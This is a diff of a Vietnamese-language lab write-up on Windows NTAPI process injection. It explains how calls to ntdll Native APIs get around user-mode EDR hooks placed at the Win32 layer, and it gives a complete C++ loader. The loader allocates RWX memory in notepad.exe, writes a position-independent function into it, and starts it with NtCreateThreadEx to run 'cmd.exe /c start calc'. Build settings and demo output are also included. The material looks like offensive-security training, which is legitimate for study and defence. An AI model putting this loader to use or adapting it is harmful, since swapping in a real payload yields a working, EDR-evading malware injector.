@@ -3,43 +3,44 @@
 
 # 📝 [PE 23] NTAPI Injection (Direct Native API Execution)
 
-## 📌 1. Tổng Quan Kỹ Thuật (Overview)
+## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)
 
-**NTAPI Injection** (Native API Injection) là giải thuật né tránh phòng thủ động chuyên sâu, tập trung đánh lừa các cơ chế giám sát dựa trên tầng Win32 Subsystem bọc ngoài của các giải pháp AV/EDR hiện đại.
+**NTAPI Injection (Can thiệp bộ nhớ qua cổng Native API)** đại diện cho giải thuật can thiệp không gian ảo và điều phối luồng xử lý chuyên sâu, thuộc phân hệ **Né tránh cơ chế bẫy Hook tầng Win32 Subsystem (Win32 API Layer Evasion)**.
 
-Mọi chương trình Windows thông thường khi muốn can thiệp bộ nhớ chéo tiến trình đều đi qua các hàm Win32 API tài liệu hóa (Documented APIs). Tuy nhiên, đây lại là "tử huyệt" bảo mật vì các EDR luôn ưu tiên đặt Hook dày đặc tại đây.
+Mọi chương trình phần mềm thông thường trên hệ điều hành Windows khi có ý đồ can thiệp bộ nhớ ảo chéo tiến trình đều phải sử dụng các hàm Win32 API phổ thông đã được tài liệu hóa (Documented APIs). Tuy nhiên, phân hệ bọc ngoài này chính là "tử huyệt" bảo mật tĩnh và động, nơi các giải pháp Endpoint Detection and Response (EDR) ưu tiên thiết lập mật độ bẫy giám sát User-mode Inline Hooks dày đặc kịch trần.
 
-Lab PE 23 hóa giải bài toán này bằng cách **gạt bỏ hoàn toàn việc triệu hồi Win32 API nhạy cảm**. Loader sử dụng con trỏ hàm động để triệu hồi trực tiếp các System Call bọc ngoài của `ntdll.dll` (nhóm hàm mang tiền tố `Nt/Zw`). Dòng chảy dữ liệu đi thẳng từ Loader xuống lõi nhân Kernel thông qua cổng Native, bẻ gãy hoàn toàn các cảm biến an ninh đặt tại tầng Win32 Subsystem.
+Dự án PE 23 hóa giải triệt để rào cản này bằng chiến thuật **Gạt bỏ lớp thông dịch Win32 (Subsystem Interception Bypass)**. Loader thực hiện phân giải và triệu hồi trực tiếp các System Calls bọc ngoài do thư viện lõi `ntdll.dll` xuất bản (nhóm Native APIs mang tiền tố `Nt/Zw`). Dòng chảy tham số dữ liệu và điều phối lệnh CPU được vận chuyển thẳng từ không gian ảo của Loader xuống cấu trúc quản lý thuộc nhân Kernel thông qua phân hệ cổng Native, bẻ gãy hoàn toàn khả năng bắt chặn và ghi nhật ký của các cảm biến an ninh đặt tại tầng Win32 Subsystem (`kernel32.dll` / `KernelBase.dll`).
 
 ### 🎯 Mục tiêu nghiên cứu:
 
-* Vô hiệu hóa 100% các bộ lọc và bẫy Hook đặt tại tầng Win32 API (`kernel32.dll` / `KernelBase.dll`).
-* Làm chủ kỹ nghệ phân giải động và ánh xạ tham số đặc thù của các hàm Native API (`NTSTATUS` Return Type).
-* Áp dụng quy trình cấp phát động thích ứng đường dẫn hệ thống để loại bỏ hoàn toàn các chuỗi gán cứng lỗi thời.
+* **Vô hiệu hóa bộ lọc Win32 Hooks**: Vượt qua hàng rào giám sát cuộc gọi liên tiến trình của EDR bằng cách luồn lách dòng chảy thực thi xuống tháp hàm Native API.
+* **Làm chủ quy chuẩn tham số Native Subsystem**: Nghiên cứu kiến trúc cấu hình cấu trúc dữ liệu đặc thù của các hàm nhân (`NTSTATUS` Return Taxonomy) và cơ chế quản lý con trỏ cấp thấp.
 
 ---
 
-## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)
+## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)
 
-Trong kiến trúc phân lớp của Windows OS, lớp Win32 chỉ là một lớp thông dịch (Wrapper). Khi bạn gọi `VirtualAllocEx`, mã nguồn inside của Microsoft thực chất sẽ chuyển đổi tham số và gọi xuống `NtAllocateVirtualMemory` của `ntdll.dll` trước khi chuyển giao cho CPU thực hiện lệnh Syscall hạ tầng xuống Kernel.
+Trong kiến trúc phân lớp (Layered Architecture) của hệ điều hành Windows, phân hệ Win32 Subsystem thực chất chỉ đóng vai trò là một lớp thông dịch trung gian (Wrapper Layer). Khi mã nguồn ứng dụng phát lệnh triệu hồi một hàm như `VirtualAllocEx`, phân hệ bọc trong của Microsoft (`kernel32.dll`) sẽ thực hiện chuyển đổi cấu trúc tham số đầu vào, thiết lập bản ghi và phát lệnh gọi xuống hàm Native tương ứng là `NtAllocateVirtualMemory` sống lọt lòng `ntdll.dll` trước khi CPU thực thi lệnh ngắt hệ thống **`syscall`** để hạ cánh xuống Ring 0.
 
-Quy trình toán học giải phẫu và chọc thủng phân hệ bọc ngoài của Lab PE 23 diễn ra qua 4 bước ngầm sau:
-
-```
-[GetModuleHandle: Trỏ ntdll] ──> [GetProcAddress: Phân giải NtAPI] ──> [NtAllocateVirtualMemory: Mở RAM từ xa] ──> [NtWriteVirtualMemory: Đổ Payload] ──> [NtCreateThreadEx: Khai hỏa]
+Quy trình giải phẫu bản đồ RAM và chọc thủng phân hệ bọc ngoài Win32 được điều phối ngầm qua 4 giai đoạn cấu trúc:
 
 ```
+[Mở Handle] ──> [NtAllocateVirtualMemory: Phân bổ trang thực thi chéo tiến trình từ xa]
+                     └──> [NtWriteVirtualMemory: Bơm mã máy PIC và bảng dữ liệu tham số]
+                               └──> [NtCreateThreadEx: Khởi tạo luồng Native kích nổ Payload]
 
-1. **Bóc tách con trỏ Native ngầm**: Loader sử dụng cặp bài trùng `GetModuleHandleA` và `GetProcAddress` trỏ vào `ntdll.dll` để bốc tách địa chỉ sống trên RAM của các hàm thô: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, và `NtCreateThreadEx`.
-2. **Cấp phát bộ nhớ tầng thấp (`NtAllocateVirtualMemory`)**: Thay vì nhận các tham số đơn giản, hàm Native yêu cầu truyền địa chỉ trang nhớ dưới dạng con trỏ của con trỏ (`PVOID* BaseAddress`) và kích thước vùng nhớ dạng tham chiếu (`PSIZE_T RegionSize`). Kernel sẽ trực tiếp xử lý phân vùng mang cờ **`PAGE_EXECUTE_READWRITE` (RWX)** chéo tiến trình mục tiêu.
-3. **Bơm máu trực tiếp chéo tiến trình (`NtWriteVirtualMemory`)**: Đổ dữ liệu cấu trúc tham số tuyệt đối toán học và khối mã máy PIC trực tiếp sang RAM đối phương thông qua handle tiến trình, không để lại bất kỳ gợn nhật ký Win32 nào.
-4. **Kích nổ luồng Native (`NtCreateThreadEx`)**: Hàm tối cao này tạo luồng từ xa mà không cần thông qua sự kiểm duyệt của phân hệ Win32 Subsystem, ép CPU của nạn nhân tự động rút lệnh thực thi Payload của ta.
+```
+
+1. **Bóc tách con trỏ Native ngầm**: Loader phối hợp sử dụng giải thuật phân giải động trỏ thẳng vào vùng nhớ ảo của `ntdll.dll` nhằm trích xuất tọa độ Base Address sống của tháp hàm Native tối cao: `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, và `NtCreateThreadEx`.
+2. **Cấp phát bộ nhớ ảo tầng thấp (`NtAllocateVirtualMemory`)**: Khác biệt hoàn toàn với các tham số đơn giản của Win32 API, hàm Native API yêu cầu mã nguồn truyền địa chỉ vùng nhớ dưới dạng con trỏ cấp hai (`PVOID* BaseAddress`) cùng thông số độ rộng vùng nhớ dưới dạng tham chiếu chỉ mục (`PSIZE_T RegionSize`). Nhân Kernel tiếp nhận lệnh, trực tiếp phân bổ dải trang nhớ mang cờ đặc quyền **`PAGE_EXECUTE_READWRITE` (RWX)** lọt lòng tiến trình mục tiêu.
+3. **Bơm dữ liệu trực tiếp chéo tiến trình (`NtWriteVirtualMemory`)**: Loader thực hiện lệnh ánh xạ mảng byte dữ liệu tuyệt đối toán học và khối mã máy PIC trực tiếp sang bộ nhớ RAM của đối phương thông qua cổng Native, hoàn toàn không thông qua lớp đệm thông dịch bọc ngoài, triệt tiêu chỉ dấu sinh nhật ký Win32.
+4. **Khai hỏa luồng Native Object (`NtCreateThreadEx`)**: Hàm Native tối cao này thiết lập một cấu trúc Thread Object nằm lọt lòng danh bạ quản lý của tiến trình mục tiêu (`notepad.exe`) mà không cần sự thông qua của lớp quản lý luồng cấp Win32, cưỡng bách CPU đối phương bước vào chu kỳ rút lệnh thực thi Payload.
 
 ---
 
 ## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)
 
-Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Cấp phát động Thích ứng (Zero Static Buffers)** và xử lý mã lỗi hệ thống `NTSTATUS` chuẩn chỉ kịch trần.
+Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** kết hợp quy trình quản lý và xử lý mã lỗi hệ thống `NTSTATUS` chuẩn chỉ kịch trần bảo mật hệ thống.
 
 ```cpp
 #include <windows.h>
@@ -84,10 +85,10 @@ typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
 
 typedef struct _THREAD_DATA {
     fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
-    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
+    char szCommand[32];       // Phân vùng chứa chuỗi lệnh thực thi chức năng nằm khít cấu trúc
 } THREAD_DATA, * PTHREAD_DATA;
 
-// 2. Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy khi tiêm chéo tiến trình
+// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy khi tiêm chéo tiến trình mục tiêu
 DWORD WINAPI RemoteNativePayload(LPVOID lpParam) {
     PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
     if (pData && pData->pWinExec) {
@@ -96,7 +97,7 @@ DWORD WINAPI RemoteNativePayload(LPVOID lpParam) {
     return 0;
 }
 
-// Bộ quét RAM động tự động nhận diện PID linh hoạt, KHÔNG PHÂN BIỆT chữ hoa chữ thường
+// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
 DWORD GetProcessIDByName(const std::wstring& processName) {
     DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -104,7 +105,10 @@ DWORD GetProcessIDByName(const std::wstring& processName) {
 
     if (Process32FirstW(hSnapshot, &pe32)) {
         do {
-            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { processID = pe32.th32ProcessID; break; }
+            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { 
+                processID = pe32.th32ProcessID; 
+                break; 
+            }
         } while (Process32NextW(hSnapshot, &pe32));
     }
     CloseHandle(hSnapshot);   return processID;
@@ -118,7 +122,7 @@ int main() {
     std::wstring targetProcess = L"notepad.exe";
     DWORD pid = GetProcessIDByName(targetProcess);
     if (pid == 0) {
-        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad nhen." << std::endl;
+        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
         return EXIT_FAILURE;
     }
     std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;
@@ -126,22 +130,22 @@ int main() {
     HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) return EXIT_FAILURE;
 
-    // Phân giải động các cổng Native API trực tiếp từ ntdll.dll để bypass Win32 bọc ngoài
+    // Phân giải động các cổng Native API trực tiếp từ ntdll.dll để bypass Win32 bọc ngoài hoàn toàn
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
     pNtWriteProcessMemory NtWriteVirtualMemory = (pNtWriteProcessMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
     pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
 
     if (!NtAllocateVirtualMemory || !NtWriteVirtualMemory || !NtCreateThreadEx) {
-        std::cerr << "[-] Khong the phan giai he thong Native APIs thô!" << std::endl;
+        std::cerr << "[-] Khong the phan giaii he thong Native APIs tho!" << std::endl;
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
     std::cout << "[+] Da bat dong bo va anh xa thanh cong thap ham NTAPI." << std::endl;
 
-    // ─── BƯỚC 1: NTALLOCATEVIRTUALMEMORY - CẤP PHÁT BỘ NHỚ TẦNG THẤP TỪ XA ───
+    // ─── BƯỚC 1: NTALLOCATEVIRTUALMEMORY - CẤP PHÁT BỘ NHỚ TẦNG THẤP TỪ XA CHÉO RAM ───
     PVOID remoteCodeBuffer = NULL;
-    SIZE_T codeSize = 500; // Áp dụng Quy trình cấp phát động Thích ứng
+    SIZE_T codeSize = 500; // Áp dụng Quy trình cấp phát động thích ứng
     
     NTSTATUS status = NtAllocateVirtualMemory(hProcess, &remoteCodeBuffer, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
@@ -150,13 +154,14 @@ int main() {
     status |= NtAllocateVirtualMemory(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 
     if (status != 0 || !remoteCodeBuffer || !remoteDataBuffer) {
-        std::cerr << "[-] NtAllocateVirtualMemory failed! STATUS: 0x" << std::hex << status << std::endl;
+        std::cerr << "[-] NtAllocateVirtualMemory failed! STATUS Code: 0x" << std::hex << status << std::endl;
+        if (remoteCodeBuffer) VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
     std::cout << "[+] Cap phat trang thuc thi qua NTAPI tai RAM: 0x" << std::hex << remoteCodeBuffer << std::endl;
 
-    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ
+    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ phục vụ ánh xạ chéo bộ nhớ
     THREAD_DATA localData;
     HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
     if (hKernel32) {
@@ -164,18 +169,18 @@ int main() {
     }
     strcpy_s(localData.szCommand, "cmd.exe /c start calc");
 
-    // ─── BƯỚC 2: NTWRITEVIRTUALMEMORY - BƠM MÃ MÁY VÀ DỮ LIỆU CHÉO RAM ───
+    // ─── BƯỚC 2: NTWRITEVIRTUALMEMORY - BƠM MÃ MÁY VÀ BẢNG THAM SỐ TUYỆT ĐỐI CHÉO RAM ───
     status = NtWriteVirtualMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteNativePayload, 500, NULL);
     status |= NtWriteVirtualMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);
 
     if (status != 0) {
-        std::cerr << "[-] NtWriteVirtualMemory that bai!" << std::endl;
+        std::cerr << "[-] NtWriteVirtualMemory that bai! STATUS Code: 0x" << std::hex << status << std::endl;
         CloseHandle(hProcess);
         return EXIT_FAILURE;
     }
     std::cout << "[+] Nap ma may va tham so tuyet doi vao xac Notepad hoan tat." << std::endl;
 
-    // ─── BƯỚC 3: NTCREATETHREADEX - KÍCH NỔ LUỒNG NATIVE TỪ XA ───
+    // ─── BƯỚC 3: NTCREATETHREADEX - KÍCH NỔ LUỒNG NATIVE TỪ XA CHÉO TIẾN TRÌNH ───
     std::cout << "[*] Dang dung NtCreateThreadEx de sinh luong ngam tu xa..." << std::endl;
     HANDLE hThread = NULL;
     status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);
@@ -185,10 +190,10 @@ int main() {
         std::cout << "[+] NTAPI Direct Injection Process Executed Successfully!" << std::endl;
         CloseHandle(hThread);
     } else {
-        std::cerr << "[-] NtCreateThreadEx that bai! NTSTATUS: 0x" << std::hex << status << std::endl;
+        std::cerr << "[-] NtCreateThreadEx that bai! NTSTATUS Code: 0x" << std::hex << status << std::endl;
     }
 
-    // Đóng handle bảo an hệ thống triệt để chống Memory Leak
+    // Đóng Handle thiết lập kết nối nhằm bảo an cấu trúc triệt để chống Memory Leak
     CloseHandle(hProcess);
 
     std::cout << "\n[*] Hoan thanh quy trinh NTAPI. Nhan Enter de dong cua so..." << std::endl;
@@ -200,19 +205,25 @@ int main() {
 
 ---
 
-## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)
+## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)
 
-### ⚙️ Thiết lập trên Microsoft Visual Studio:
+Để cấu trúc file nhị phân xuất bản đạt trạng thái độc lập hoàn toàn kịch khung, có khả năng thực thi trơn tru không phụ thuộc môi trường khi mang sang môi trường máy ảo VM cô lập:
 
-1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
-2. Đi tới mục cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, chuyển cấu hình sang cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống chạy mượt mà độc lập trên máy ảo VM sạch.
-3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng.
+### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:
+
+1. Đặt thanh cấu hình quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
+2. Di chuyển đến phân hệ cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính mục `Runtime Library`, chuyển thông số sang định dạng cờ liên kết tĩnh **`Multi-threaded (/MT)`** nhằm liên kết toàn vẹn thư viện CRT lọt lòng file thực thi `.exe`.
+
+> **Vị trí đặt ảnh minh chứng cấu hình hệ thống:**
+> 
+
+3. Tiến hành thực hiện click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng hoàn hảo.
 
 ---
 
-## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)
+## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)
 
-Bật sẵn ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô và chạy file nhị phân:
+Khởi chạy ứng dụng mục tiêu `Notepad.exe` trên môi trường Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành để theo dõi ma trận thực thi tầng thấp:
 
 ```powershell
 PS C:\Workspace\x64\Release> .\PE23_NTAPI_Injection.exe
@@ -230,8 +241,22 @@ PS C:\Workspace\x64\Release> .\PE23_NTAPI_Injection.exe
 
 ```
 
-*🎯 Hệ quả RAM tối cao:*
-Ứng dụng Máy tính `calc.exe` bật bung hiên ngang tại runtime rực rỡ kịch trần kịch khung! Chiến dịch chọc thủng phân hệ bọc ngoài gặt hái thành công mỹ mãn. Vì Loader hoàn toàn bypass các API phổ thông của lớp Win32 Subsystem, các bộ giám sát hành vi bọc ngoài của Security Agents đều bị qua mặt một cách hoàn toàn sạch bóng!
+> **Vị trí đặt ảnh minh chứng thực nghiệm thực thi Native API:**
+> 
+
+### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Forensic Results):
+
+* Cấu trúc can thiệp dứt điểm thành công xuất sắc, ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch trần kịch khung kịch nền**!
+* Do mã nguồn Loader hoàn toàn giải phóng sự phụ thuộc vào các cuộc gọi liên tỉnh mức Win32 Subsystem, các bẫy giám sát cuộc gọi bọc ngoài đặt tại User-mode của EDR Engine đều bị vượt qua một cách hoàn toàn sạch bóng.
+* Dòng chảy System Call đi thẳng từ Ring 3 xuống Ring 0 thông qua các cổng Native không tài liệu hóa (`Undocumented Entries`), khẳng định bệ phóng bảo mật lý tưởng của phân hệ can thiệp tầng thấp!
 
 ---
 
+## 📚 6. Tài Liệu Tham Khảo (Technical References)
+
+* **Microsoft Learn Subsystem Architecture**: *Windows Core Internal Functions & NtAllocateVirtualMemory Spec Specifications* - Windows Native API Reference Guide.
+* **Gary Nebbett**: *Windows NT/2000 Native API Reference* - In-depth structural documentation on undocumented entry points.
+* **Phineas (Malware Evasion Frameworks)**: *Bypassing User-Mode Win32 Hooks via Subsystem-Level Native Calling Conventions*.
+* **MITRE ATT&CK Matrix System**: *Defense Evasion: Native API Execution (T1106)* & *Process Injection (T1055)*.
+
+---
